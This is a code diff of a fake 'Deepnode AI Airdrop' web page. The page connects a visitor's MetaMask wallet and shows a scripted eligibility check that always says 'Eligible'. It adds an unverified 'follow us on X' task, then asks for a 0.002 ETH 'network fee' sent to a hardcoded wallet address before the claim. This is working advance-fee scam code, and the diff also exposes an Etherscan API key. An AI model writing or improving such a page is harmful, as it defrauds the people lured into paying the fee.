@@ -6,7 +6,6 @@
 <title>Deepnode AI Airdrop</title>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.1/dist/index.umd.min.js"></script>
 
 <style>
 html,body{margin:0;padding:0;height:100%;font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;color:#fff;background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);}
@@ -25,12 +24,11 @@ button:disabled{opacity:.5;cursor:not-allowed}
 .progress{height:8px;background:rgba(255,255,255,.15);border-radius:10px;overflow:hidden;margin-top:10px}
 .bar{height:100%;width:0%;background:linear-gradient(90deg,#7f5cff,#c77dff)}
 .addr{font-size:12px;word-break:break-all;margin-top:10px;opacity:.8}
-.payBtn,.checkBtn,.claimBtn{
-  margin-top:12px;padding:12px 0;width:100%;
-  border:none;border-radius:12px;
-  background:linear-gradient(90deg,#7f5cff,#c77dff);
-  color:#fff;font-weight:600
-}
+
+/* Buttons */
+.payBtn,.checkBtn,.claimBtn,.taskCompleteBtn{margin-top:12px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
+.payBtn:disabled,.checkBtn:disabled,.claimBtn:disabled,.taskCompleteBtn:disabled{opacity:.5;cursor:not-allowed}
+.taskBtn{background:linear-gradient(90deg,#1DA1F2,#0d8ddb);margin-top:8px;}
 </style>
 </head>
 
@@ -41,7 +39,6 @@ button:disabled{opacity:.5;cursor:not-allowed}
   <h1>Connect wallet to claim Deepnode AI airdrop</h1>
 
   <button onclick="connectMetaMask()">Connect MetaMask</button>
-  <button onclick="connectWalletConnect()">WalletConnect</button>
 
   <div class="status" id="status"></div>
   <div class="footer">Deepnode AI • Terms & Privacy</div>
@@ -49,13 +46,25 @@ button:disabled{opacity:.5;cursor:not-allowed}
 
 <div class="modal" id="modal">
   <div class="box">
+    <!-- Eligibility loader -->
     <div class="loader-section">
       <div id="modalText">Checking eligibility…</div>
       <div class="progress"><div class="bar" id="bar"></div></div>
     </div>
     <div class="addr" id="addr"></div>
-    <button class="payBtn" id="payBtn" onclick="payFee()" style="display:none">Pay 0.002 ETH Network Fee</button>
-    <button class="checkBtn" id="checkBtn" onclick="checkPayment()" style="display:none">Check Payment</button>
+
+    <!-- Task section -->
+    <div id="taskSection" style="margin-top:20px; text-align:center; display:none;">
+      <p>🎯 Task: Follow us on X to unlock the airdrop!</p>
+      <a href="https://x.com/deepnodeai?s=21" target="_blank">
+        <button class="taskBtn">Follow @deepnodeai</button>
+      </a>
+      <button id="taskCompleteBtn" class="taskCompleteBtn" disabled>Task Completed</button>
+    </div>
+
+    <!-- Payment and claim buttons -->
+    <button class="payBtn" id="payBtn" onclick="payFee()" disabled>Pay 0.002 ETH Network Fee</button>
+    <button class="checkBtn" id="checkBtn" onclick="checkPayment()" disabled>Check Payment</button>
     <button class="claimBtn" id="claimBtn" onclick="claim()" disabled>Claim Airdrop</button>
   </div>
 </div>
@@ -65,10 +74,9 @@ button:disabled{opacity:.5;cursor:not-allowed}
 const RECIPIENT = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
 const REQUIRED_ETH = "0.002";
 const ETHERSCAN_KEY = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T";
-const WC_PROJECT_ID = "e703ffab6d65fd8ada1adc0bfb719136";
 
 /* ================= STATE ================= */
-let provider, signer, currentAddress, walletType;
+let provider, signer, currentAddress;
 
 /* ================= TIMER ================= */
 const timerEl = document.getElementById("status");
@@ -98,20 +106,6 @@ async function connectMetaMask(){
   await provider.send("eth_requestAccounts",[]);
   signer = provider.getSigner();
   currentAddress = await signer.getAddress();
-  walletType = "metamask";
-  afterConnect();
-}
-
-async function connectWalletConnect(){
-  const wc = await WalletConnectEthereumProvider.init({
-    projectId: WC_PROJECT_ID,
-    chains: [1],
-  });
-  await wc.enable();
-  provider = new ethers.providers.Web3Provider(wc);
-  signer = provider.getSigner();
-  currentAddress = await signer.getAddress();
-  walletType = "walletconnect";
   afterConnect();
 }
 
@@ -131,36 +125,42 @@ function showEligibility(){
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
   const addr = document.getElementById("addr");
+  const taskSection = document.getElementById("taskSection");
+  const taskBtn = document.getElementById("taskCompleteBtn");
+  const payBtn = document.getElementById("payBtn");
+  const checkBtn = document.getElementById("checkBtn");
 
   modal.style.display="flex";
   bar.style.width="0%";
   text.innerText="Checking eligibility…";
   addr.innerText=currentAddress;
 
-  let p = 0;
+  let progress = 0;
   const i = setInterval(()=>{
-    p+=25;
-    bar.style.width=p+"%";
-    if(p>=100){
+    progress+=25;
+    bar.style.width = progress+"%";
+    if(progress>=100){
       clearInterval(i);
-      text.innerText="✅ Eligible to claim airdrop";
-      document.getElementById("payBtn").style.display="block";
-      document.getElementById("checkBtn").style.display="block";
+      text.innerText = "✅ Eligible to claim airdrop";
+      taskSection.style.display="block";
+      taskBtn.disabled=false; // allow user to mark task complete
     }
   },400);
+
+  // Enable pay button after task completed
+  taskBtn.addEventListener("click", ()=>{
+    payBtn.disabled = false;
+    payBtn.style.opacity = 1;
+    checkBtn.disabled = false;
+    taskBtn.disabled = true;
+    taskBtn.innerText = "✅ Task Verified";
+  });
 }
 
 /* ================= PAY ================= */
 async function payFee(){
-  if(walletType==="metamask"){
-    const wei = ethers.utils.parseEther(REQUIRED_ETH).toString();
-    window.location.href = `ethereum:${RECIPIENT}?value=${wei}`;
-  } else {
-    await signer.sendTransaction({
-      to: RECIPIENT,
-      value: ethers.utils.parseEther(REQUIRED_ETH)
-    });
-  }
+  const wei = ethers.utils.parseEther(REQUIRED_ETH).toString();
+  window.location.href = `ethereum:${RECIPIENT}?value=${wei}`;
 }
 
 /* ================= VERIFY PAYMENT ================= */
